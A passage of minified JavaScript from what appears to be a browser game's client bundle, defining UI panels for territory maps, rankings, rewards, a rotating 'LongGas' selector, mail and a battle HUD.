eui.Image;e.source=this.getWeatherImgUrl(),e.x=this.width/2,e.y=this.height/2,e.scaleX=e.scaleY=2,this.addChild(e),this.WeatherIcon=e,this.Weather.visible=!1,egret.Tween.get(e).wait(1e3).to({x:this.Weather.x,y:this.Weather.y,scaleX:1,scaleY:1},2e3,egret.Ease.cubicInOut).call(function(){n.DisplayUtils.removeFromParent(t.WeatherIcon),t.Weather.visible=!0})},e.prototype.removeDisplay=function(){this.WeatherIcon&&(egret.Tween.removeTweens(this.WeatherIcon),n.DisplayUtils.removeFromParent(this.WeatherIcon),this.WeatherIcon=null)},e.isFirstInit=!1,__decorate([delayCall(100)],e.prototype,"updateTopView",null),e}(o.BaseView);e.LingJingMainPanel=v,window.LingJingMainPanel=v,__reflect(v.prototype,"LingJingMainPanel",[]),window.LingJingMainPanel=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingWildWindow=void 0;var n=i(5),o=i(1),s=i(77),a=i(15),r=i(12),l=i(2),h=i(117),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.buildType=[2,5,6,7],e._sn_="LingJingWildSkin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardList.itemRenderer=s.ItemBaseNoName,this.rewardList.dataProvider=this.eArc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return this.info=t[0],this.info&&this.info.cfg?(this.addTouchEvent(this,this.onBtnClick),this.observe(h.LingJingCT.ins().postLingJingBuilding,this.updateView),void this.updateView()):void win.close(this)},e.prototype.removeDisplay=function(){},e.prototype.onBtnClick=function(t){switch(t.target){case this.closeBtn:win.close(this);break;case this.play:var e=win.get("LingJingMainPanel");e&&e.movePlayerToGrid(this.info.gridX,this.info.gridY),win.close(this)}},e.prototype.updateView=function(){this.info&&this.info.cfg&&(this.txtName.text=this.info.cfg.name,this.desc.textFlow=n.TextFlowMaker.generateTextFlow1(this.info.cfg.desc),-1!=this.buildType.indexOf(this.info.cfg.type)?(this.monhead.visible=!1,this.buildhead.visible=!0,this.buildhead.source=this.info.cfg.iconD,this.play.label=gettext("占领")):(this.monhead.visible=!0,this.buildhead.visible=!1,this.monhead.source=this.info.cfg.iconD+"_png",this.play.label=gettext("讨伐")),this.info.cfg.awards&&this.info.cfg.awards[0]?(this.reward.visible=!0,this.eArc.source=this.info.cfg.awards.concat()):this.reward.visible=!1)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.OpenSystem.ins().checkSysOpen(a.SystemType.LingJing);return i||l.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(a.SystemType.LingJing)),i},e}(o.BaseView);e.LingJingWildWindow=u,window.LingJingWildWindow=u,__reflect(u.prototype,"LingJingWildWindow",[]),window.LingJingWildWindow=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingBuildWindow=void 0;var n=i(1),o=i(15),s=i(12),a=i(2),r=i(436),l=i(117),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LingJingBuildingSkin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.buildList.itemRenderer=r.LingJingBuildItem,this.buildList.dataProvider=this.eArc=new eui.ArrayCollection([]),l.LingJingCT.ins().sendLingJingBuilding()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.closeBtn,this.onBtnClick),this.observe(l.LingJingCT.ins().postLingJingBuilding,this.updateView),this.observe(l.LingJingCT.ins().postLingJingBuildLvUp,this.updateView),this.observe(l.LingJingCT.ins().postLingJingMaterial,this.updateView),this.updateView()},e.prototype.removeDisplay=function(){},e.prototype.onBtnClick=function(t){win.close(this)},e.prototype.updateView=function(){var t=[];for(var e in l.LingJingCT.ins().buildInfoDic){var i=l.LingJingCT.ins().buildInfoDic[e];t.push(i)}this.eArc.replaceAll(t)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=s.OpenSystem.ins().checkSysOpen(o.SystemType.LingJing);return i||a.TipsCT.ins().showTips(s.OpenSystem.ins().getNoOpenTips(o.SystemType.LingJing)),i},e}(n.BaseView);e.LingJingBuildWindow=h,window.LingJingBuildWindow=h,__reflect(h.prototype,"LingJingBuildWindow",[]),window.LingJingBuildWindow=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingInfoWindow=void 0;var n=i(1),o=i(15),s=i(12),a=i(2),r=i(117),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LingJingInfoSkin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.closeBtn,this.onBtnClick),this.tab.addEventListener(eui.UIEvent.CHANGE,this.onTabChange,this),r.LingJingCT.ins().sendLingJingBuff()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.tab.selectedIndex=0},e.prototype.removeDisplay=function(){},e.prototype.onBtnClick=function(t){win.close(this)},e.prototype.updateTabView=function(){},e.prototype.onTabChange=function(t){this.updateTabView()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=s.OpenSystem.ins().checkSysOpen(o.SystemType.LingJing);return i||a.TipsCT.ins().showTips(s.OpenSystem.ins().getNoOpenTips(o.SystemType.LingJing)),i},e}(n.BaseView);e.LingJingInfoWindow=l,window.LingJingInfoWindow=l,__reflect(l.prototype,"LingJingInfoWindow",[]),window.LingJingInfoWindow=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingRewardWindow=void 0;var n=i(5),o=i(1),s=i(0),a=i(15),r=i(10),l=i(12),h=i(2),u=i(117),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LingJingRewardSkin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return this.info=t[0],this.info?(this.addTouchEvent(this,this.onBtnClick),this.observe(u.LingJingCT.ins().postLingJingBuilding,this.updateView),void this.updateView()):void win.close(this)},e.prototype.removeDisplay=function(){},e.prototype.onBtnClick=function(t){switch(t.target){case this.closeBtn:case this.play:win.close(this)}},e.prototype.updateView=function(){if(this.info){var t=this.info.buffIdList[0]||0,e=s.GlobalConfig.LingJingBenefitConfig[t];if(e){switch(this.txt_name1.text=e.title,this.txt_name2.textFlow=n.TextFlowMaker.generateTextFlow1(e.desc),e.quality){case 1:this.imgBg.source="forest_card_green";break;case 2:this.imgBg.source="forest_card_blue";break;case 3:this.imgBg.source="forest_card_purple";break;case 4:this.imgBg.source="forest_card_orange";break;case 5:this.imgBg.source="forest_card_red"}this.txt_name1.textColor=r.ItemUtil.getQualityColor(e.quality)}else this.txt_name1.text="",this.txt_name2.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("没有获得buff")),this.imgBg.source="forest_card_green";var i=this.info.materialDic;this.Wood.text=(i[11]||0).toString(),this.Stone.text=(i[12]||0).toString(),this.Steel.text=(i[13]||0).toString(),this.Meat.text=(i[14]||0).toString()}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(a.SystemType.LingJing);return i||h.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(a.SystemType.LingJing)),i},e}(o.BaseView);e.LingJingRewardWindow=p,window.LingJingRewardWindow=p,__reflect(p.prototype,"LingJingRewardWindow",[]),window.LingJingRewardWindow=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingRankPanel=void 0;var n=i(8),o=i(1),s=i(15),a=i(4),r=i(12),l=i(88),h=i(71),u=i(7),p=i(2),d=i(438),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="LingJingRankPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.PerRanking.itemRenderer=d.LingJingRankItem,this.PerRanking.dataProvider=this.eArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),this.observe(l.Rank.ins().postRankingData,this.updataRankInfo),l.Rank.ins().sendGetRankingData(h.RankDataType.TYPE_LINGJING),this.updateView()},e.prototype.onTap=function(t){t.target},e.prototype.updateView=function(){this.leader0.data=null,this.member0.data=null,this.member1.data=null,this.selfrank0.text=gettext("未上榜"),this.selftime2.text="0",this.selfnameLabel1.text="S."+u.GameServerCC.serverID,this.selfnameLabel2.text=a.ActorCC.myName},e.prototype.updataRankInfo=function(t){if(t.type==h.RankDataType.TYPE_LINGJING){for(var e=t.getDataList(),i=[],o=0,s=0;s<e.length;s++){var r=e[s];1==r.pos?this.leader0.data=r:2==r.pos?this.member0.data=r:3==r.pos?this.member1.data=r:i.push(r),r.player==a.ActorCC.myName&&(o=r.times)}this.eArc.source=i,this.noPlayerTips.visible=!e.length,this.selfrank0.text=0<t.selfPos&&t.selfPos<=1e3?gettext("第{0}名",t.selfPos):gettext("未上榜");var l="";o>0&&(l=n.DateUtils.getFormatBySecond(o,n.DateUtils.TIME_FORMAT_1),l=l.slice(0,-3)),this.selftime2.text=l,this.selfnameLabel1.text="S."+u.GameServerCC.serverID,this.selfnameLabel2.text=a.ActorCC.myName}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.OpenSystem.ins().checkSysOpen(s.SystemType.LingJing);return i||p.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(s.SystemType.LingJing)),i},e.prototype.removeDisplay=function(){},e}(o.BaseView);e.LingJingRankPanel=c,window.LingJingRankPanel=c,__reflect(c.prototype,"LingJingRankPanel",[]),window.LingJingRankPanel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingRewardPanel=void 0;var n=i(1),o=i(0),s=i(15),a=i(12),r=i(2),l=i(439),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="LingJingRewardPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.PerRanking0.useVirtualLayout=!0,this.PerRanking0.itemRenderer=l.LingJingRewardItem,this.PerRanking0.dataProvider=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),this.updateView()},e.prototype.onTap=function(t){t.target},e.prototype.updateView=function(){var t=[],e=[];for(var i in o.GlobalConfig.LingJingRankConfig){var n=o.GlobalConfig.LingJingRankConfig[i];e[n.range]=e[n.range]||[],e[n.range].push(n)}for(var s in e)e[s]&&t.push(e[s]);t.sort(function(t,e){return t[0].rank<e[0].rank?-1:1}),this.PerRanking0.dataProvider=new eui.ArrayCollection(t)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=a.OpenSystem.ins().checkSysOpen(s.SystemType.LingJing);return i||r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(s.SystemType.LingJing)),i},e.prototype.removeDisplay=function(){},e}(n.BaseView);e.LingJingRewardPanel=h,window.LingJingRewardPanel=h,__reflect(h.prototype,"LingJingRewardPanel",[]),window.LingJingRewardPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasPanel=void 0;var n=i(1),o=i(0),s=i(441),a=i(133),r=i(442),l=i(4),h=i(12),u=i(15),p=i(2),d=i(110),c=i(19),f=i(49),g=i(443),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LongGasPanelSkin",e.isPa=!1,e.radius=250,e.highRa=30,e.objectCount=0,e.objects=[],e.widthX=0,e.hightY=320,e.speed=.01,e.isJiHuo=!1,e.idx=-1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.btnHelp,this.onTap),this.eList.itemRenderer=r.LongGasAttrItem,this.eList.dataProvider=this._normalListDada=new eui.ArrayCollection,this.eList0.itemRenderer=r.LongGasAttrItem,this.eList0.dataProvider=this._selectListDada=new eui.ArrayCollection,this.costCmlist1.itemRenderer=d.CostComRender,this._curCostArr1=new eui.ArrayCollection,this.costCmlist1.dataProvider=this._curCostArr1},e.prototype.addDisplay=function(){this.iList.itemRenderer=g.LongGasNameItem;var t=[],e=o.GlobalConfig.LoongGasCfg;if(e)for(var i in e)t.push(e[i].nameshow);this.iList.dataProvider=new eui.ArrayCollection(t),this.iList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),observe(this,this.setOpenDesGrop,a.LongGasCT.ins().selectOpenLongGasByID),observe(this,this.setOpenDesGrop,l.ActorCC.postUpdateLongGas),observe(this,this.setOpenDesGrop,a.LongGasCT.ins().updateGETUPTOP),observe(this,this.setOpenDesGrop,a.LongGasCT.ins().updateUseSkill),observe(this,this.setDatas,a.LongGasCT.ins().updateLongUseSkill),a.LongGasCT.ins().returnLenOfLoongGasArr(),this.isPa=!0,this.visibleGrop(),this.initPanel()},e.prototype.removeDisplay=function(){},e.prototype.onTap=function(t){var e;switch(t.target){case this.btnHelp:win.open("CommonHelpWin",(null===(e=o.GlobalConfig.HelpInfoConfig[352])||void 0===e?void 0:e.text)||"");break;case this.eGet:if(this.eGet.enabled){var i=this.isJiHuo?2:1;if(a.LongGasCT.ins().longActIDArr.length>=o.GlobalConfig.LoongGasSkillCfg[a.LongGasCT.ins().useLongGas].useSkillMax&&1==i)return void p.TipsCT.ins().showTips(gettext("已满上限"));a.LongGasCT.ins().setLongGasGo(i)}break;case this.eBack:this.setOpenNormalGrop();break;case this.eDraw:var n=a.LongGasCT.ins().returnLongGasUnlockDataByID(a.LongGasCT.ins().openSelectID);n&&n.lv>0&&(a.LongGasCT.ins().outDrawValue==a.LongGasCT.ins().openSelectID?a.LongGasCT.ins().setCancelLongGas(0):a.LongGasCT.ins().setCancelLongGas(a.LongGasCT.ins().openSelectID));break;case this.btnjihuo:var s=o.GlobalConfig.LoongGasSkillCfg[a.LongGasCT.ins().useLongGas+1];if(s)for(var r in s.cost)if(!c.GlobalFun.checkCost(s.cost[r].count,s.cost[r].id,"",!0,null,!1))return;a.LongGasCT.ins().setLongItemUse()}},e.prototype.onItemClick=function(t){t.itemIndex!=this.idx&&(this.idx=t.itemIndex,a.LongGasCT.ins().openSelectID=this.idx+1,this.setOpenDesGrop())},e.prototype.setOpenDesGrop=function(){-1==this.idx&&this.iList&&this.iList.numElements>0&&(this.iList.selectedIndex=this.idx),this.isPa=!1,this.visibleGrop(),this.setLongGasDes()},e.prototype.setOpenNormalGrop=function(){this.idx=-1,this.isPa=!0,this.visibleGrop(),this.initPanel()},e.prototype.visibleGrop=function(){this.normalGrop.visible=this.isPa,this.longGasDesGrop.visible=!this.isPa},e.prototype.initPanel=function(){var t=o.GlobalConfig.LoongGasCfg;if(t){this.removeGas(),this.objects=[],this.objectCount=0,egret.stopTick(this.moveBall,this);for(var e in t){var i=new s.LongGasEnergy;i.data=t[e],this.longGasSelect.addChild(i),this.objects.push(i),this.objectCount++}this.layoutObjects(),this.initCenter(),this.setDatas()}},e.prototype.layoutObjects=function(){for(var t=2*Math.PI/this.objectCount,e=0;e<this.objectCount;e++){var i=t*e+t/2,n=this.radius*Math.cos(i)-this.widthX,o=(this.radius+this.highRa)*Math.sin(i)+this.hightY;this.objects[e].x=n,this.objects[e].y=o,this.objects[e].angle=i}},e.prototype.initCenter=function(){this.centerX=-this.widthX/2,this.centerY=this.hightY},e.prototype.startAnimation=function(){egret.startTick(this.moveBall,this)},e.prototype.moveBall=function(t){if(this.longGasSelect.numElements>0)for(var e=this.longGasSelect.numElements-1;e>=0;e--){var i=this.longGasSelect.getElementAt(e);if(i){i.angle+=this.speed;var n=this.centerX+this.radius*Math.cos(i.angle),o=this.centerY+this.radius*Math.sin(i.angle);i.x=n,i.y=o}}return!0},e.prototype.setDatas=function(){this._normalListDada.source=a.LongGasCT.ins().getAllLongGasAtrr(),this._normalListDada.refresh(),this.setCost()},e.prototype.setCost=function(){this.nums.text=a.LongGasCT.ins().longActIDArr.length+"/"+o.GlobalConfig.LoongGasSkillCfg[a.LongGasCT.ins().useLongGas].useSkillMax,0==a.LongGasCT.ins().useLongGas?this.longGasNum0.filters=f.FilterUtil.ARRAY_GRAY_FILTER:this.longGasNum0.filters=f.FilterUtil.normalColor,this.bmpTxtLv0.text=""+a.LongGasCT.ins().useLongGas;var t=o.GlobalConfig.LoongGasSkillCfg[a.LongGasCT.ins().useLongGas+1];if(t){this.costLabel0.visible=!0,this.btnjihuo.visible=!0;var e=[];for(var i in t.cost)e.push({cost:{type:t.cost[i].type,id:t.cost[i].id,count:t.cost[i].count},isShowHas:!0,isShowXh:!1});this._curCostArr1.source=e,this._curCostArr1.refresh()}else this.costLabel0.visible=!1,this.btnjihuo.visible=!1},e.prototype.setLongGasDes=function(){var t=o.GlobalConfig.LoongGasCfg[a.LongGasCT.ins().openSelectID];if(t){this.LongGasStateShowPanel.InitData(),this._selectListDada.source=a.LongGasCT.ins().getLongGasAtrrById(),this._selectListDada.refresh();var e=a.LongGasCT.ins().returnLongGasUnlockDataByID(a.LongGasCT.ins().openSelectID),i=e?Math.ceil(e.lv/10):0;this.longName.source=t.name+"",this.bmpTxtLv1.text=i+"",this.items.isSetSkill();var n=a.LongGasCT.ins().returnLongGasUnlockDataByID(a.LongGasCT.ins().openSelectID);if(n){var s=o.GlobalConfig.LoongGasSuitCfg[a.LongGasCT.ins().openSelectID][n.lv],r=!0;this.items.data={skillID:s.skillid,isCan:r,lv:n.lv};var l=a.LongGasCT.ins().longActIDArr.indexOf(a.LongGasCT.ins().openSelectID);this.eGet.enabled=!0,-1==l?(this.eGet.label=gettext("装 备"),this.isJiHuo=!1):(this.eGet.label=gettext("卸 下"),this.isJiHuo=!0),this.eDraw.enabled=!0,a.LongGasCT.ins().outDrawValue>0&&a.LongGasCT.ins().outDrawValue==a.LongGasCT.ins().openSelectID?this.eDraw.label=gettext("卸 下"):this.eDraw.label=gettext("穿 戴")}else{var s=o.GlobalConfig.LoongGasSuitCfg[a.LongGasCT.ins().openSelectID][1],r=!1;this.items.data={skillID:s.skillid,isCan:r,lv:0},this.eGet.enabled=!1,this.eGet.label=gettext("装 备"),this.isJiHuo=!1,this.eDraw.enabled=!1}}},e.prototype.removeGas=function(){if(this.longGasSelect.numElements>0)for(var t=this.longGasSelect.numElements-1;t>=0;t--){var e=this.longGasSelect.getElementAt(t);e&&e.ClearAll(),this.longGasSelect.removeChildAt(t)}},e.prototype.tabRp=function(){return a.LongGasCT.ins().AllBagRed.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.OpenSystem.ins().checkSysOpen(u.SystemType.LongGas);return i||p.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(u.SystemType.LongGas)),i},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return h.OpenSystem.ins().checkSysShow(u.SystemType.LongGas)},e}(n.BaseView);e.LongGasPanel=m,window.LongGasPanel=m,__reflect(m.prototype,"LongGasPanel",[]),window.LongGasPanel=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasStateShowPanel=void 0;var n=i(21),o=i(16),s=i(1),a=i(0),r=i(133),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LongGasStateSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){},e.prototype.removeDisplay=function(){},e.prototype.InitData=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i,o;return __generator(this,function(s){switch(s.label){case 0:return(t=a.GlobalConfig.LoongGasCfg[r.LongGasCT.ins().openSelectID])?(e=t.actcond.length,this.currentState=e+"",this.removeEff(),[4,this.validateNow()]):[3,2];case 1:for(s.sent(),i=t.actcond,o=0;e>o;o++)this["item"+o].data=i[o];null==this.effect&&(this.effect=new n.MovieClip,this.effgroup.addChild(this.effect)),this.effect.scaleX=this.effect.scaleY=t.size1||1,this.effect.x=t.pos1?t.pos1[0]:0,this.effect.y=t.pos1?t.pos1[1]:0,this.effect.playFile(RES_DIR_EFF+t.inside,-1),s.label=2;case 2:return[2]}})})},e.prototype.removeEff=function(){this.cleanEff()},e.prototype.cleanEff=function(){this.effect&&(o.DisplayUtils.removeFromParent(this.effect),this.effect=null)},e}(s.BaseView);e.LongGasStateShowPanel=l,window.LongGasStateShowPanel=l,__reflect(l.prototype,"LongGasStateShowPanel",[]),window.LongGasStateShowPanel=l},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.YupeiSkillTipsWin=void 0;var n=i(5),o=i(1),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="YupeiSkillTipsNewSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.nameLabel.text=t[0],this.description.textFlow=n.TextFlowMaker.generateTextFlow1(t[1])},e}(o.BaseView);e.YupeiSkillTipsWin=s,window.YupeiSkillTipsWin=s,__reflect(s.prototype,"YupeiSkillTipsWin",[]),window.YupeiSkillTipsWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MailWin=void 0;var n=i(1),o=i(445),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="mailwinskin",e.oldIndex=0,e.sTitle="",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.eTab,this.onTabTouch),this.addChangingEvent(this.eTab,this.onTabTouching)},e.prototype.addDisplay=function(t){var e;isNaN(t)&&(t=Math.max(this.eVs.getItemIndex(null===(e=this[t])||void 0===e?void 0:e.name),0)),observe(this,this.updateReds,o.MailRedPoint.ins().postRedPoint),this.addTouchEvent(this.closeBtn,this.onClick),this.oldIndex=this.eTab.selectedIndex=this.eVs.selectedIndex=t;var i=this.eVs.selectedIndex;this.setOpenIndex(i)},e.prototype.checkIsOpen=function(t){switch(this.eVs.getElementAt(t)){case this.MailPanel:return!0}return!0},e.prototype.onClick=function(t){switch(t.target){case this.closeBtn:win.close(this)}},e.prototype.onTabTouch=function(t){this.setOpenIndex(this.eTab.selectedIndex)},e.prototype.onTabTouching=function(t){this.checkIsOpen(this.eTab.selectedIndex)||t.preventDefault()},e.prototype.setTabSelectedIndex=function(t){this.eTab.selectedIndex=t,this.oldIndex=t,this.setOpenIndex(t)},e.prototype.setOpenIndex=function(t){this.checkIsOpen(t)&&(this.sTitle="mail_title"+t,this.oldIndex!=t?this.oldIndex=t:this.eTab.selectedIndex=this.eVs.selectedIndex=t)},e.prototype.updateReds=function(){this.eTab.updateReds()},__decorate([delayCall(100)],e.prototype,"updateReds",null),e}(n.BaseView);e.MailWin=s,window.MailWin=s,__reflect(s.prototype,"MailWin",[]),window.MailWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainBattleUi=void 0;var n=i(8),o=i(1),s=i(37),a=i(4),r=i(13),l=i(20),h=i(53),u=i(32),p=i(23),d=i(46),c=i(7),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layoutNum=LayoutNum.top,e.defaultRect=!1,e._sn_="mainBattleUiSkin",e.notShowCD=!1,e.startTtime=3,e.peakEndTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btn,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateHp,Ts.entityHpChange),observe(this,this.initHp,p.GameLogic.ins().postCreateOtherEntity),observe(this,this.showTarget,p.GameLogic.ins().postCreateOtherEntity),observe(this,this.exit,p.GameLogic.ins().postEnterMap),observe(this,this.startPeakCountDown,u.FbCT.ins().postFbTime),observe(this,this.setHSFbTime,d.HegemonyCT.ins().postCountdown),this.notShowCD=t[0]?!0:!1,this.starShow(),this.showMe(),this.titleDes.text=t[1]||"",this.hpVal1.text=this.hpVal2.text="",this.peakEndTime=0,this.initHp(),this.showTarget(),this.startPeakCountDown(),this.setHSFbTime(),this.curMapType=l.GameMap.fbType,this.btnGrp.visible=l.GameMap.fbType==u.FbCT.FB_PVP},e.prototype.starShow=function(){var t=this;if(this.notShowCD)return this.timeGrp.visible=!1,h.ControlCC.setAuto(!1),void h.ControlCC.setAuto(!0);this.timeGrp.visible=!0,this.timeImg.source="ds_3";var e=this.startTtime,i=e+1;this.timeImg.source="ds_"+e,Timer.start(1e3,i,function(){return e--,-1>=e?(t.timeGrp.visible=!1,h.ControlCC.setAuto(!1),void h.ControlCC.setAuto(!0)):void(t.timeImg.source=e>0?"ds_"+e:"ds_star")},this)},e.prototype.showTarget=function(){var t,e,i,n=s.EntityManager.ins().findOtherTar();n&&n.infoModel&&(this.peakEndTime=0,this.nameLab2.text=(null===(t=n.infoModel)||void 0===t?void 0:t.name)||"",this.eFace2.source=n.infoModel?"yuanhead"+((null===(e=n.infoModel)||void 0===e?void 0:e.job)||"")+((null===(i=n.infoModel)||void 0===i?void 0:i.sex)||""):"")},e.prototype.showMe=function(){var t=r.SubRoles.ins().getSubRoleByIndex(0);this.nameLab1.text=a.ActorCC.myName,this.eFace1.source="yuanhead"+t.job+t.sex},e.prototype.initHp=function(){var t,e,i,n,o,a,l,h,u=r.SubRoles.lookAtTar;u?(this.hpVal1.text=((null===(t=u.infoModel)||void 0===t?void 0:t.hp)||0)+"/"+((null===(e=u.infoModel)||void 0===e?void 0:e.hp_max)||0),this.hpBar1.value=((null===(i=u.infoModel)||void 0===i?void 0:i.hp)||0)/((null===(n=u.infoModel)||void 0===n?void 0:n.hp_max)||1)*100):this.hpBar1.value=0;
var p=s.EntityManager.ins().findOtherTar();p?(this.hpVal2.text=((null===(o=p.infoModel)||void 0===o?void 0:o.hp)||0)+"/"+((null===(a=p.infoModel)||void 0===a?void 0:a.hp_max)||0),this.hpBar2.value=100*((null===(l=p.infoModel)||void 0===l?void 0:l.hp)||0/(null===(h=p.infoModel)||void 0===h?void 0:h.hp_max)||1)):this.hpBar2.value=0},e.prototype.updateHp=function(t){var e,i,n,o,a,r,l,h;if(t){var u=s.EntityManager.ins().getEntityByHandle(t.handle);if(u&&u.infoModel&&u.infoModel.type!=EntityType.Pet){u.infoModel.isMy&&(this.hpVal1.text=((null===(e=u.infoModel)||void 0===e?void 0:e.hp)||0)+"/"+((null===(i=u.infoModel)||void 0===i?void 0:i.hp_max)||0),this.hpBar1.value=((null===(n=u.infoModel)||void 0===n?void 0:n.hp)||0)/((null===(o=u.infoModel)||void 0===o?void 0:o.hp_max)||1)*100);var p=s.EntityManager.ins().findOtherTar();p&&(this.hpVal2.text=((null===(a=p.infoModel)||void 0===a?void 0:a.hp)||0)+"/"+((null===(r=p.infoModel)||void 0===r?void 0:r.hp_max)||0),this.hpBar2.value=((null===(l=p.infoModel)||void 0===l?void 0:l.hp)||0)/((null===(h=p.infoModel)||void 0===h?void 0:h.hp_max)||1)*100)}}},e.prototype.onClick=function(){send(Ts.exitFB),win.close(this)},e.prototype.exit=function(){(this.curMapType!=l.GameMap.fbType||this.curMapType==u.FbCT.FB_TYPE_GUANQIABOSS||this.curMapType==u.FbCT.FB_TYPE_CITY)&&win.close(this)},e.prototype.startPeakCountDown=function(){if(l.GameMap.fbType!=u.FbCT.FB_TYPE_PEAKED)return void(this.bigTimeGroup.visible=!1);this.peakEndTime=n.DateUtils.formatMiniDateTime(u.FbCT.ins().curFbLeftTime);var t=s.EntityManager.ins().findOtherTar();t&&t.infoModel&&(this.peakEndTime=0),this.timeGo(),this.peakEndTime-c.GameServerCC.serverTime>0&&!Timer.has(this.timeGo,this)&&(this.bigTimeGroup.visible=!0,Timer.start(1e3,0,this.timeGo,this))},e.prototype.setHSFbTime=function(){},e.prototype.updateHSFbTime=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(d.HegemonyCT.ins().countdown)-c.GameServerCC.serverTime)/1e3);t=0>=t?0:t,this.teamFbTime.text=gettext("剩余时间：")+t},e.prototype.timeGo=function(){var t=(this.peakEndTime-c.GameServerCC.serverTime)/1e3>>0;t>0?this.countDown.text=t+"":(Timer.stop(this.timeGo,this),this.bigTimeGroup.visible=!1)},e}(o.BaseView);e.MainBattleUi=f,window.MainBattleUi=f,__reflect(f.prototype,"MainBattleUi",[]),window.MainBattleUi=f},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainBot=void 0;var n=i(21),o=i(1),s=i(34),a=i(37),r=i(145),l=i(17),h=i(15),u=i(4),p=i(20),d=i(80),c=i(9),f=i(56),g=i(130),m=i(6),v=i(307),y=i(198),C=i(54),T=i(23),b=i(254),w=i(28),I=i(147),_=i(51),S=i(149),x=i(12),D=i(25),A=i(38),k=i(134),B=i(123),P=i(86),R=i(312),E=i(52),G=i(69),M=i(183),L=i(141),F=i(73),O=i(35),N=i(223),W=i(26),U=i(195),H=i(155),q=i(60),j=i(133),V=i(84),Y=i(78),K=i(98),Q=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e.mainView=!0,e._sn_="mainbotskin",e}return 